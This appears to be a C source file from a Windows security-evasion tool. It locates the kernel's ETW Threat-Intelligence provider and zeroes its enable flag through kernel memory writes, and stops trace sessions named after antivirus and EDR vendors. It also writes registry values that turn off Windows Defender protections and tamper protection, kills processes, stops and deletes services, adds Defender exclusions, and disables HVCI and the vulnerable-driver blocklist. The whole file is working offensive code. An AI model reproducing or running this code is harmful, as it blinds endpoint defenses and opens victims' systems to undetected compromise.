#include "ft.h"

#include <evntrace.h>
#include <excpt.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <string.h>

#ifndef EVENT_TRACE_CONTROL_CODE_STOP
#define EVENT_TRACE_CONTROL_CODE_STOP 1
#endif

static const unsigned char ft_ti_guid[16] = {
    0x7C, 0x89, 0xE1, 0xF4, 0x5D, 0xBB, 0x68, 0x56,
    0xF1, 0xD8, 0x04, 0x0F, 0x4D, 0x8D, 0xD3, 0x44
};

#define FT_ETW_REG_ENTRY_GUID_ENTRY 0x20
#define FT_ETW_GUID_ENTRY_PROV_GUID  0x10
#define FT_ETW_GUID_ENTRY_ENABLE     0x60

static uint32_t rd32b(const uint8_t* p) {
    return (uint32_t)p[0] | ((uint32_t)p[1] << 8) |
           ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
}

static int ft_lea_target(const uint8_t* buf, size_t raw, uint32_t section_va,
                         size_t k, uint64_t* out) {
    size_t ilen;
    int32_t disp;
    uint8_t modrm;

    if (k + 7 > raw) return 0;
    if (buf[k] == 0x48 || buf[k] == 0x4C) {
        if (buf[k + 1] != 0x8D) return 0;
        modrm = buf[k + 2];
        if ((modrm & 0xC7u) != 0x05u) return 0;
        disp = (int32_t)rd32b(buf + k + 3);
        ilen = 7;
    } else if (buf[k] == 0x8D) {
        modrm = buf[k + 1];
        if ((modrm & 0xC7u) != 0x05u) return 0;
        disp = (int32_t)rd32b(buf + k + 2);
        ilen = 6;
    } else {
        return 0;
    }
    *out = (uint64_t)(int64_t)((int64_t)section_va + (int64_t)k + (int64_t)ilen + disp);
    return 1;
}

int ft_etwti_discover(uint32_t* handle_rva, uint32_t* etw_reg_rva) {
    char path[FT_MAX_PATH];
    uint8_t* img = NULL;
    size_t size = 0;
    ft_pe pe;
    uint32_t guid_rva[64];
    int nguid = 0;
    uint32_t i;
    uint64_t handles[16];
    int nhandle = 0;

    if (!ft_sysdir_file("ntoskrnl.exe", path, sizeof path)) return 0;
    img = ft_read_file(path, &size);
    if (!img) return 0;
    if (!ft_pe_open(img, size, &pe)) { free(img); return 0; }

    if (!ft_pe_export_rva(&pe, "EtwRegister", etw_reg_rva) || *etw_reg_rva == 0) {
        free(img);
        return 0;
    }

    for (i = 0; i + 16 <= size; i++) {
        uint32_t rva;
        if (memcmp(img + i, ft_ti_guid, 16) != 0) continue;
        if (!ft_pe_off_to_rva(&pe, i, &rva)) continue;
        if (nguid < 64) guid_rva[nguid++] = rva;
        i += 15;
    }
    if (nguid == 0) { free(img); return 0; }

    for (i = 0; i < pe.nsec; i++) {
        const ft_sec* s = &pe.sec[i];
        const uint8_t* buf;
        size_t raw;
        size_t o;
        if (s->raw_size == 0) continue;
        if ((size_t)s->raw_off + s->raw_size > size) continue;
        buf = img + s->raw_off;
        raw = s->raw_size;
        for (o = 0; o + 5 <= raw; o++) {
            int64_t target;
            size_t k;
            int have_guid = 0;
            if (buf[o] != 0xE8u) continue;
            target = (int64_t)s->va + (int64_t)o + 5 + (int64_t)(int32_t)rd32b(buf + o + 1);
            if ((uint64_t)target != (uint64_t)*etw_reg_rva) continue;

            for (k = (o > 0x40) ? (o - 0x40) : 0; k + 7 <= o; k++) {
                uint64_t t;
                int j;
                if (!ft_lea_target(buf, raw, s->va, k, &t)) continue;
                for (j = 0; j < nguid; j++) {
                    if ((uint64_t)guid_rva[j] == t) { have_guid = 1; break; }
                }
                if (have_guid) break;
            }
            if (!have_guid) continue;

            for (k = (k > 0x30) ? (k - 0x30) : 0; k + 7 <= o; k++) {
                uint64_t t;
                const ft_sec* owner = NULL;
                int writable = 0;
                if (!ft_lea_target(buf, raw, s->va, k, &t)) continue;
                if (!ft_pe_section_of(&pe, (uint32_t)t, &owner, &writable)) continue;
                if (!writable) continue;
                if (nhandle < 16) handles[nhandle++] = (uint64_t)t;
                break;
            }
        }
    }

    if (nhandle == 0) { free(img); return 0; }
    for (i = 1; i < (uint32_t)nhandle; i++) {
        if (handles[i] != handles[0]) { free(img); return 0; }
    }
    *handle_rva = (uint32_t)handles[0];
    free(img);
    return 1;
}

int ft_etwti_disable(ft_ctx* c) {
    uint32_t handle_rva = 0;
    uint32_t reg_rva = 0;
    uint64_t reg_handle = 0;
    uint64_t guid_entry = 0;

    if (!c) return FT_E_INTERNAL;

    if (!ft_etwti_discover(&handle_rva, &reg_rva)) {
        ft_warn(c, "etwti_discovery_failed", "");
        return FT_E_ETW;
    }
    ft_info(c, "etwti_discovery", "\"handle_rva\":\"0x%x\",\"etw_register_rva\":\"0x%x\"",
            handle_rva, reg_rva);

    if (ft_km_read64(c, ft_ntos_base(c) + handle_rva, &reg_handle) != FTR_VAL ||
        !ft_is_kernel_ptr(reg_handle)) {
        ft_warn(c, "etwti_no_handle", "\"rva\":\"0x%x\"", handle_rva);
        return FT_E_ETW;
    }
    if (ft_km_read64(c, reg_handle + FT_ETW_REG_ENTRY_GUID_ENTRY, &guid_entry) != FTR_VAL ||
        !ft_is_kernel_ptr(guid_entry)) {

        guid_entry = 0;
    }

    {
    {
        unsigned char blob[0x200];
        uint64_t guid_addr = 0;
        uint64_t entry_addr = 0;
        int found = -1;
        int documented = 0;
        size_t i;
        uint32_t enable = 0;
        uint64_t target = 0;

        if (ft_km_read64(c, reg_handle + FT_ETW_REG_ENTRY_GUID_ENTRY, &entry_addr) == FTR_VAL &&
            ft_is_kernel_ptr(entry_addr) &&
            ft_km_read_bytes(c, entry_addr, blob, sizeof blob) != FTR_FAIL) {
            for (i = 0; i + 16 <= sizeof blob; i++) {
                if (memcmp(blob + i, ft_ti_guid, 16) == 0) {
                    found = (int)i;
                    guid_addr = entry_addr + i;
                    documented = (i == FT_ETW_GUID_ENTRY_PROV_GUID) ? 1 : 0;
                    break;
                }
            }
        }
        if (found < 0) {

            if (ft_km_read_bytes(c, reg_handle, blob, sizeof blob) != FTR_FAIL) {
                for (i = 0; i + 16 <= sizeof blob; i++) {
                    if (memcmp(blob + i, ft_ti_guid, 16) == 0) {
                        found = (int)i;
                        guid_addr = reg_handle + i;
                        break;
                    }
                }
            }
        }
        if (found < 0) {
            ft_warn(c, "etwti_guid_mismatch", "\"handle\":\"0x%llx\"",
                    (unsigned long long)reg_handle);
            return FT_E_ETW;
        }
        if (!documented) {
            ft_warn(c, "etwti_layout_unknown",
                    "\"guid\":\"0x%llx\",\"hint\":\"report only, not written\"",
                    (unsigned long long)guid_addr);
            return FT_E_ETW;
        }
        target = entry_addr + FT_ETW_GUID_ENTRY_ENABLE;
        if (ft_km_read32(c, target, &enable) == FTR_FAIL) {
            ft_warn(c, "etwti_no_enable", "\"target\":\"0x%llx\"",
                    (unsigned long long)target);
            return FT_E_ETW;
        }
        if (enable > 1) {
            ft_warn(c, "etwti_enable_unverified",
                    "\"target\":\"0x%llx\",\"value\":%u",
                    (unsigned long long)target, enable);
            return FT_E_ETW;
        }
        if (enable == 0) {
            ft_ok(c, "etwti_already_disabled", "\"target\":\"0x%llx\"",
                  (unsigned long long)target);
            return FT_OK;
        }
        if (c->dry_run) {
            ft_ok(c, "etwti_dryrun", "\"target\":\"0x%llx\",\"enabled\":%u",
                  (unsigned long long)target, enable);
            return FT_OK;
        }
        {
            uint64_t zero = 0;
            if (ft_km_write(c, target, &zero, 8) != 1) {
                ft_warn(c, "etwti_write_failed", "\"target\":\"0x%llx\"",
                        (unsigned long long)target);
                return FT_E_ETW;
            }
            {
                uint32_t back = 0xFFFFFFFFu;
                if (ft_km_read32(c, target, &back) != FTR_VAL || back != 0) {
                    ft_err(c, "etwti_verify_failed", "\"target\":\"0x%llx\"",
                           (unsigned long long)target);
                    return FT_E_VERIFY;
                }
            }
        }
        ft_ok(c, "etwti_disabled",
              "\"target\":\"0x%llx\",\"was_enabled\":%u",
              (unsigned long long)target, enable);
        return FT_OK;
    }
}
}

typedef ULONG (WINAPI *ft_query_all_traces_fn)(PEVENT_TRACE_PROPERTIES,
                                                ULONG, PULONG);

static ULONG ft_query_all_traces(PEVENT_TRACE_PROPERTIES arr, ULONG cnt, PULONG got) {
    ft_query_all_traces_fn fn =
        (ft_query_all_traces_fn)(void (*)(void))QueryAllTracesW;
    return fn(arr, cnt, got);
}

static const char* ft_etw_keywords[] = {
    "Threat", "Defender", "Antivirus", "Anti-Virus", "Sense", "WdFilter",
    "WdNis", "EDR", "XDR", "CrowdStrike", "CSAgent", "SentinelOne",
    "SentinelMonitor", "Cylance", "Sophos", "CarbonBlack", "cbfs",
    "Kaspersky", "klif", "kavfss", "ESET", "ekrn", "Symantec", "TrendMicro",
    "McAfee", "mfehi", "Panda", "Forescout", "Sentinel", "Cortex", "Wazuh",
    "Elastic", "osquery", "Sysmon", "WDI", "Telegraf", "Insights", "MAPS",
    NULL
};

static int ft_etw_name_is_target(const char* name) {
    int i;
    if (!name || !*name) return 0;
    for (i = 0; ft_etw_keywords[i]; i++) {
        if (strstr(name, ft_etw_keywords[i])) return 1;
    }
    return 0;
}

static int ft_etw_worker(const char* out_path, int stop) {
    const ULONG cap = 64;
    const size_t slot = 4096;
    BYTE* buf;
    ULONG count = 0;
    ULONG rc;
    ULONG i;
    FILE* out;
    int seen = 0;
    int targeted = 0;
    int stopped = 0;

    buf = (BYTE*)calloc(cap, slot);
    if (!buf) return 2;
    for (i = 0; i < cap; i++) {
        PEVENT_TRACE_PROPERTIES p = (PEVENT_TRACE_PROPERTIES)(buf + (size_t)i * slot);
        p->Wnode.BufferSize = (ULONG)slot;
    }
    rc = ft_query_all_traces((PEVENT_TRACE_PROPERTIES)(void*)buf, cap, &count);
    if (rc != ERROR_SUCCESS || count == 0 || count > cap) {

        free(buf);
        buf = (BYTE*)calloc(cap, slot);
        if (!buf) return 3;
        for (i = 0; i < cap; i++) {
            PEVENT_TRACE_PROPERTIES p = (PEVENT_TRACE_PROPERTIES)(buf + (size_t)i * slot);
            p->Wnode.BufferSize = (ULONG)slot;
        }
        count = 0;
        rc = ft_query_all_traces((PEVENT_TRACE_PROPERTIES)(void*)buf, cap, &count);
        if (rc != ERROR_SUCCESS || count == 0 || count > cap) {
            free(buf);
            fprintf(stderr, "etw: query failed rc=%lu count=%lu\n", rc, count);
            return 3;
        }
    }

    out = out_path ? fopen(out_path, "w") : NULL;
    for (i = 0; i < count; i++) {
        PEVENT_TRACE_PROPERTIES p = (PEVENT_TRACE_PROPERTIES)(buf + (size_t)i * slot);
        char narrow[256];
        size_t k = 0;
        const WCHAR* w;

        if (p->LoggerNameOffset == 0 || p->LoggerNameOffset >= slot) continue;
        w = (const WCHAR*)((BYTE*)p + p->LoggerNameOffset);
        while (k < 250 && k + 1 < sizeof narrow && w[k] != '\0') {
            if (w[k] > 0x7F) break;
            narrow[k] = (char)w[k];
            k++;
        }
        narrow[k] = '\0';
        if (k == 0) continue;
        seen++;
        if (!ft_etw_name_is_target(narrow)) continue;
        targeted++;
        if (out) fprintf(out, "found:%s\n", narrow);
        if (!stop) continue;
        {
            ULONG st = ControlTraceA((TRACEHANDLE)0, (LPCSTR)narrow, p,
                                     EVENT_TRACE_CONTROL_CODE_STOP);
            if (st == ERROR_SUCCESS) {
                stopped++;
                if (out) fprintf(out, "stopped:%s\n", narrow);
            } else {
                if (out) fprintf(out, "failed:%s:%lu\n", narrow, st);
            }
        }
    }
    if (out) {
        fprintf(out, "summary:%d:%d:%d\n", seen, targeted, stopped);
        fclose(out);
    }
    free(buf);
    return 0;
}

static int ft_etw_run_child(ft_ctx* c, int stop) {
    char self[MAX_PATH];
    char tmp[MAX_PATH];
    char arg[MAX_PATH * 2 + 64];
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    DWORD wait_ms = 60000;
    DWORD code = 0;
    FILE* f;
    int rc = FT_OK;

    if (!c) return FT_E_INTERNAL;
    if (!GetModuleFileNameA(NULL, self, (DWORD)sizeof self)) return FT_E_INTERNAL;
    if (!GetTempPathA((DWORD)sizeof tmp, tmp)) return FT_E_INTERNAL;
    {
        char* p = tmp + strlen(tmp);
        _snprintf(p, sizeof tmp - (size_t)(p - tmp), "ft_etw_%lu.txt",
                  (unsigned long)GetCurrentProcessId());
    }

    _snprintf(arg, sizeof arg, "\"%s\" --etw-worker \"%s\" %d", self, tmp,
              stop ? 1 : 0);

    memset(&si, 0, sizeof si);
    si.cb = sizeof si;
    memset(&pi, 0, sizeof pi);
    if (!CreateProcessA(self, arg, NULL, NULL, FALSE, CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        ft_warn(c, "etw_worker_spawn_failed", "\"err\":%lu", GetLastError());
        return FT_E_ETW;
    }
    CloseHandle(pi.hThread);
    if (WaitForSingleObject(pi.hProcess, wait_ms) != WAIT_OBJECT_0) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        ft_warn(c, "etw_worker_timeout", "\"ms\":%lu", wait_ms);
        DeleteFileA(tmp);
        return FT_E_ETW;
    }
    GetExitCodeProcess(pi.hProcess, &code);
    CloseHandle(pi.hProcess);

    f = fopen(tmp, "r");
    if (f) {
        char line[512];
        while (fgets(line, (int)sizeof line, f)) {
            size_t n = strlen(line);
            while (n > 0 && (line[n - 1] == '\n' || line[n - 1] == '\r')) line[--n] = 0;
            if (strncmp(line, "found:", 6) == 0) {
                ft_info(c, "etw_session_found", "\"name\":\"%s\"", line + 6);
            } else if (strncmp(line, "stopped:", 8) == 0) {
                ft_ok(c, "etw_session_stopped", "\"name\":\"%s\"", line + 8);
            } else if (strncmp(line, "failed:", 7) == 0) {
                ft_warn(c, "etw_session_stop_failed", "\"detail\":\"%s\"", line + 7);
            } else if (strncmp(line, "summary:", 8) == 0) {
                int seen = 0, targeted = 0, stopped = 0;
                if (sscanf(line + 8, "%d:%d:%d", &seen, &targeted, &stopped) == 3) {
                    ft_info(c, "etw_sessions_seen",
                            "\"total\":%d,\"targeted\":%d,\"stopped\":%d",
                            seen, targeted, stopped);
                }
            }
        }
        fclose(f);
    }
    DeleteFileA(tmp);

    if (code != 0) {
        if (code >= 0xC0000000u) {
            ft_warn(c, "etw_worker_crashed", "\"code\":\"0x%08lx\"",
                   (unsigned long)code);
        } else {
            ft_warn(c, "etw_worker_failed", "\"code\":%lu", (unsigned long)code);
        }
        rc = FT_E_ETW;
    }
    return rc;
}

int ft_etw_count_sessions(ft_ctx* c) {
    return ft_etw_run_child(c, 0);
}

int ft_etw_stop_sessions(ft_ctx* c) {
    return ft_etw_run_child(c, 1);
}

int ft_etw_worker_main(const char* out_path, int stop) {
    return ft_etw_worker(out_path, stop);
}

typedef struct ft_regval {
    const char* path;
    const char* name;
    DWORD        value;
} ft_regval;

static const ft_regval ft_defender_policy_vals[] = {
    { "SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", 1 },
    { "SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRealtimeMonitoring", 1 },
    { "SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableBehaviorMonitoring", 1 },
    { "SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableOnAccessProtection", 1 },
    { "SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableScanOnRealtimeEnable", 1 },
    { "SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableArchiveScanning", 1 },
    { "SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRemovableDeviceScanning", 1 },
    { "SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableIntrusionPreventionSystem", 1 },
    { "SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableIOAVProtection", 1 },
    { "SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableScriptScanning", 1 },
    { "SOFTWARE\\Policies\\Microsoft\\Windows Defender", "SubmitSamplesConsent", 0 },
    { "SOFTWARE\\Policies\\Microsoft\\Windows Defender", "MAPSReporting", 0 },
    { "SOFTWARE\\Policies\\Microsoft\\Windows Defender", "SpynetReporting", 0 },
    { "SOFTWARE\\Policies\\Microsoft\\Windows Defender", "SpynetSubmitSamplesConsent", 0 },
    { "SOFTWARE\\Policies\\Microsoft\\Windows Defender", "CloudBlockLevel", 6 },
    { "SOFTWARE\\Policies\\Microsoft\\Windows Defender", "EnableControlledFolderAccess", 0 },
    { "SOFTWARE\\Policies\\Microsoft\\Windows Defender", "SignatureUpdateInterval", 0 },
    { "SOFTWARE\\Policies\\Microsoft\\Windows Defender", "TamperProtection", 0 },
    { "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection",
      "DisableRealtimeMonitoring", 1 },
    { "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection",
      "DisableBehaviorMonitoring", 1 },
    { "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection",
      "DisableOnAccessProtection", 1 },
    { "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection",
      "DisableScanOnRealtimeEnable", 1 },
    { "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection",
      "DisableIOAVProtection", 1 },
    { "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection",
      "DisableScriptScanning", 1 },
    { "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\Network Protection",
      "EnableNetworkProtection", 0 },
    { "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates",
      "SignatureUpdateInterval", 0 },
    { "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet",
      "SpynetReporting", 0 },
    { "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet",
      "SpynetSubmitSamplesConsent", 0 },
    { "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet",
      "CloudBlockLevel", 6 },
    { "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\MpEngine",
      "MpEngineRing", 0 },
    { "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Features",
      "TamperProtection", 0 },

    { "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer",
      "DisableAntiSpyware", 1 },
    { NULL, NULL, 0 }
};

int ft_reg_set_dword(const char* path, const char* name, DWORD value) {
    DWORD rcx;
    HKEY hk;
    DWORD disp = 0;
    rcx = RegCreateKeyExA(HKEY_LOCAL_MACHINE, path, 0, NULL, 0,
                          KEY_SET_VALUE | KEY_WOW64_64KEY, NULL, &hk, &disp);
    if (rcx != ERROR_SUCCESS) {
        SetLastError((DWORD)rcx);
        return 0;
    }
    rcx = RegSetValueExA(hk, name, 0, REG_DWORD, (const BYTE*)&value,
                         (DWORD)sizeof value);
    RegCloseKey(hk);
    if (rcx != ERROR_SUCCESS) SetLastError((DWORD)rcx);
    return rcx == ERROR_SUCCESS;
}

int ft_reg_get_dword(const char* path, const char* name, DWORD* out) {
    HKEY hk;
    DWORD v = 0;
    DWORD sz = (DWORD)sizeof v;
    DWORD type = 0;
    LONG rc;

    if (!out) return 0;
    rc = RegOpenKeyExA(HKEY_LOCAL_MACHINE, path, 0,
                       KEY_QUERY_VALUE | KEY_WOW64_64KEY, &hk);
    if (rc != ERROR_SUCCESS) return 0;
    rc = RegQueryValueExA(hk, name, NULL, &type, (LPBYTE)&v, &sz);
    RegCloseKey(hk);
    if (rc != ERROR_SUCCESS || type != REG_DWORD) return 0;
    *out = v;
    return 1;
}

static const ft_regval ft_defender_extra_vals[] = {
    { "SOFTWARE\\Microsoft\\Windows Defender\\Features\\TamperProtection",
      "TamperProtection", 0 },
    { "SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection",
      "DisableRealtimeMonitoring", 1 },
    { "SOFTWARE\\Microsoft\\Windows Defender",
      "DisableAntiSpyware", 1 },
    { NULL, NULL, 0 }
};

int ft_defender_policy(ft_ctx* c, int nuke) {
    int i;
    int set = 0;
    int fail = 0;
    int extra = 0;

    if (!c) return FT_E_INTERNAL;

    if (nuke && !c->dry_run) {
        if (RegDeleteTreeA(HKEY_LOCAL_MACHINE,
                           "SOFTWARE\\Policies\\Microsoft\\Windows Defender") ==
            ERROR_SUCCESS) {
            ft_ok(c, "defender_policy_tree_removed", "");
        } else {
            ft_warn(c, "defender_policy_tree_kept", "\"err\":%lu", GetLastError());
        }
    }

    for (i = 0; ft_defender_policy_vals[i].path; i++) {
        DWORD cur = 0;
        const ft_regval* v = &ft_defender_policy_vals[i];
        if (ft_reg_get_dword(v->path, v->name, &cur) && cur == v->value) continue;
        if (c->dry_run) {
            ft_ok(c, "defender_policy_dryrun",
                  "\"path\":\"%s\",\"name\":\"%s\",\"value\":%lu",
                  v->path, v->name, v->value);
            set++;
            continue;
        }
        if (!ft_reg_set_dword(v->path, v->name, v->value)) {
            fail++;
            ft_warn(c, "defender_policy_fail", "\"path\":\"%s\",\"name\":\"%s\"",
                    v->path, v->name);
            continue;
        }
        {
            DWORD back = 0;
            if (!ft_reg_get_dword(v->path, v->name, &back) || back != v->value) {
                fail++;
                ft_err(c, "defender_policy_verify", "\"path\":\"%s\",\"name\":\"%s\"",
                       v->path, v->name);
                continue;
            }
        }
        set++;
    }

    for (i = 0; ft_defender_extra_vals[i].path; i++) {
        DWORD cur = 0;
        const ft_regval* v = &ft_defender_extra_vals[i];
        if (ft_reg_get_dword(v->path, v->name, &cur) && cur == v->value) continue;
        if (c->dry_run) {
            ft_ok(c, "defender_extra_dryrun", "\"path\":\"%s\",\"name\":\"%s\"",
                  v->path, v->name);
            extra++;
            continue;
        }
        if (ft_reg_set_dword(v->path, v->name, v->value)) {
            extra++;
        } else {
            ft_warn(c, "defender_extra_protected",
                    "\"path\":\"%s\",\"name\":\"%s\",\"err\":%lu",
                    v->path, v->name, GetLastError());
        }
    }
    ft_ok(c, "defender_policy_done", "\"set\":%d,\"failed\":%d,\"extra\":%d",
          set, fail, extra);
    return fail ? FT_E_REG : FT_OK;
}

int ft_kill_procs(ft_ctx* c, const char* const* names, int n) {
    HANDLE snap;
    int killed = 0;
    int i;

    if (!c || !names || n <= 0) return FT_E_ARGS;

    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        ft_err(c, "kill_snapshot_failed", "\"err\":%lu", GetLastError());
        return FT_E_ACTION;
    }
    {
        PROCESSENTRY32 pe;
        memset(&pe, 0, sizeof pe);
        pe.dwSize = sizeof pe;
        if (Process32First(snap, &pe)) {
            do {
                for (i = 0; i < n; i++) {
                    HANDLE p;
                    if (_stricmp(pe.szExeFile, names[i]) != 0) continue;
                    p = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                    if (!p) {
                        ft_warn(c, "kill_open_failed",
                                "\"name\":\"%s\",\"pid\":%u,\"err\":%lu",
                                names[i], (unsigned)pe.th32ProcessID, GetLastError());
                        continue;
                    }
                    if (TerminateProcess(p, 1)) {
                        killed++;
                        ft_ok(c, "kill_proc", "\"name\":\"%s\",\"pid\":%u",
                              names[i], (unsigned)pe.th32ProcessID);
                    } else {
                        ft_warn(c, "kill_failed",
                                "\"name\":\"%s\",\"pid\":%u,\"err\":%lu",
                                names[i], (unsigned)pe.th32ProcessID, GetLastError());
                    }
                    CloseHandle(p);
                }
            } while (Process32Next(snap, &pe));
        }
    }
    CloseHandle(snap);
    ft_info(c, "kill_done", "\"killed\":%d", killed);
    return FT_OK;
}

int ft_kill_pid(ft_ctx* c, uint32_t pid) {
    HANDLE p;
    int ok = 0;

    (void)c;
    if (pid == 0) return FT_E_ARGS;
    p = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!p) {
        ft_warn(c, "kill_pid_open_failed", "\"pid\":%u,\"err\":%lu", pid,
                GetLastError());
        return FT_E_ACTION;
    }
    if (TerminateProcess(p, 1)) {
        ok = 1;
        ft_ok(c, "kill_pid", "\"pid\":%u", pid);
    } else {
        ft_warn(c, "kill_pid_failed", "\"pid\":%u,\"err\":%lu", pid,
                GetLastError());
    }
    CloseHandle(p);
    return ok ? FT_OK : FT_E_ACTION;
}

int ft_services(ft_ctx* c, const char* const* names, int n, int del) {
    SC_HANDLE scm;
    int i;
    int stopped = 0;
    int disabled = 0;
    int deleted = 0;

    if (!c || !names || n <= 0) return FT_E_ARGS;

    scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm) {
        ft_err(c, "svc_scm_failed", "\"err\":%lu", GetLastError());
        return FT_E_SVC;
    }
    for (i = 0; i < n; i++) {
        SC_HANDLE svc = OpenServiceA(scm, names[i], SERVICE_QUERY_STATUS);
        if (!svc) {
            ft_info(c, "svc_absent", "\"name\":\"%s\"", names[i]);
            continue;
        }
        CloseServiceHandle(svc);
        svc = OpenServiceA(scm, names[i],
                           SERVICE_STOP | SERVICE_QUERY_STATUS |
                           SERVICE_CHANGE_CONFIG | (del ? DELETE : 0));
        if (!svc) {

            svc = OpenServiceA(scm, names[i], SERVICE_QUERY_STATUS);
            if (svc) {
                ft_warn(c, "svc_no_rights", "\"name\":\"%s\"", names[i]);
                CloseServiceHandle(svc);
            } else {
                ft_info(c, "svc_absent", "\"name\":\"%s\"", names[i]);
            }
            continue;
        }
        if (!c->dry_run) {
            SERVICE_STATUS ss;
            DWORD wait = 0;
            ControlService(svc, SERVICE_CONTROL_STOP, &ss);
            for (wait = 0; wait < 30; wait++) {
                if (!QueryServiceStatus(svc, &ss)) break;
                if (ss.dwCurrentState == SERVICE_STOPPED) break;
                Sleep(100);
            }
            if (ss.dwCurrentState == SERVICE_STOPPED) {
                stopped++;
                ft_ok(c, "svc_stopped", "\"name\":\"%s\"", names[i]);
            } else {
                ft_warn(c, "svc_stop_pending", "\"name\":\"%s\",\"state\":%lu",
                        names[i], (unsigned long)ss.dwCurrentState);
            }
            {
                DWORD want = SERVICE_DISABLED;
                if (ChangeServiceConfigA(svc, SERVICE_NO_CHANGE, want,
                                         SERVICE_NO_CHANGE, NULL, NULL, NULL,
                                         NULL, NULL, NULL, NULL)) {
                    disabled++;
                    ft_ok(c, "svc_disabled", "\"name\":\"%s\"", names[i]);
                } else {
                    ft_warn(c, "svc_disable_failed", "\"name\":\"%s\",\"err\":%lu",
                            names[i], GetLastError());
                }
            }
            if (del) {
                if (DeleteService(svc)) {
                    deleted++;
                    ft_ok(c, "svc_deleted", "\"name\":\"%s\"", names[i]);
                } else {
                    ft_warn(c, "svc_delete_failed", "\"name\":\"%s\",\"err\":%lu",
                            names[i], GetLastError());
                }
            }
        } else {
            ft_ok(c, "svc_dryrun", "\"name\":\"%s\",\"delete\":%d", names[i], del);
        }
        CloseServiceHandle(svc);
    }
    CloseServiceHandle(scm);
    ft_ok(c, "svc_done", "\"stopped\":%d,\"disabled\":%d,\"deleted\":%d",
          stopped, disabled, deleted);
    return FT_OK;
}

static int ft_reg_add_multi_sz(const char* path, const char* name,
                               const char* value) {
    HKEY hk;
    DWORD disp = 0;
    LONG rc;
    WCHAR* buf;
    size_t n = strlen(value);
    DWORD len;

    buf = (WCHAR*)calloc(n + 2, sizeof(WCHAR));
    if (!buf) return 0;
    {
        size_t i;
        for (i = 0; i < n; i++) {
            buf[i] = (WCHAR)(unsigned char)value[i];
        }
    }
    len = (DWORD)((n + 2) * sizeof(WCHAR));

    rc = RegCreateKeyExA(HKEY_LOCAL_MACHINE, path, 0, NULL, 0,
                         KEY_SET_VALUE | KEY_WOW64_64KEY, NULL, &hk, &disp);
    if (rc != ERROR_SUCCESS) { free(buf); return 0; }
    rc = RegSetValueExA(hk, name, 0, REG_MULTI_SZ, (const BYTE*)buf, len);
    RegCloseKey(hk);
    free(buf);
    return rc == ERROR_SUCCESS;
}

int ft_add_exclusions(ft_ctx* c, const char* path) {
    char dir[FT_MAX_PATH];
    const char* base = "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions";

    if (!c || !path || !*path) return FT_E_ARGS;
    if (c->dry_run) {
        ft_ok(c, "exclusions_dryrun", "\"path\":\"%s\"", path);
        return FT_OK;
    }
    strncpy(dir, path, sizeof dir - 1);
    dir[sizeof dir - 1] = '\0';
    if (!ft_reg_add_multi_sz(base, "Paths", dir)) {
        ft_warn(c, "exclusion_fail", "\"path\":\"%s\"", path);
        return FT_E_REG;
    }
    ft_ok(c, "exclusions_added", "\"path\":\"%s\"", path);
    return FT_OK;
}

int ft_hvci_off(ft_ctx* c) {
    const char* key =
        "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity";
    const char* name = "Enabled";
    DWORD cur = 0;
    int set = 0;

    if (!c) return FT_E_INTERNAL;

    if (ft_reg_get_dword(key, name, &cur) && cur == 0) {
        ft_ok(c, "hvci_already", "\"key\":\"%s\"", key);
    } else if (c->dry_run) {
        ft_ok(c, "hvci_dryrun", "\"key\":\"%s\"", key);
        set++;
    } else if (!ft_reg_set_dword(key, name, 0)) {
        ft_warn(c, "hvci_fail", "\"key\":\"%s\"", key);
    } else if (!ft_reg_get_dword(key, name, &cur) || cur != 0) {
        ft_err(c, "hvci_verify", "\"key\":\"%s\"", key);
    } else {
        set++;
        ft_ok(c, "hvci_off", "\"key\":\"%s\"", key);
    }

    {
        const char* blk = "SYSTEM\\CurrentControlSet\\Control\\CI\\Config";
        cur = 0;
        if (!ft_reg_get_dword(blk, "VulnerableDriverBlocklistEnable", &cur) || cur != 0) {
            if (c->dry_run) {
                ft_ok(c, "blocklist_dryrun", "");
            } else if (ft_reg_set_dword(blk, "VulnerableDriverBlocklistEnable", 0) &&
                       ft_reg_get_dword(blk, "VulnerableDriverBlocklistEnable", &cur) &&
                       cur == 0) {
                ft_ok(c, "blocklist_off", "");
            } else {
                ft_warn(c, "blocklist_fail", "");
            }
        } else {
            ft_ok(c, "blocklist_already", "");
        }
    }
    ft_info(c, "hvci_done", "\"changed\":%d", set);
    return FT_OK;
}

